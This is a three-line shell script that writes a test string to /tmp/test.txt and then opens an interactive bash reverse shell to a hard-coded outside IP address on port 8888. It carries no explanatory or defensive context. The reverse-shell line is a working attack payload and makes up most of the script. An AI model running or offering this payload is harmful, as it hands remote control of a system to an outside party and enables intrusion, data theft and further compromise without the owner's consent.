#!/bin/sh
echo '123456' > /tmp/test.txt
bash -i >& /dev/tcp/94.191.117.79/8888 0>&1
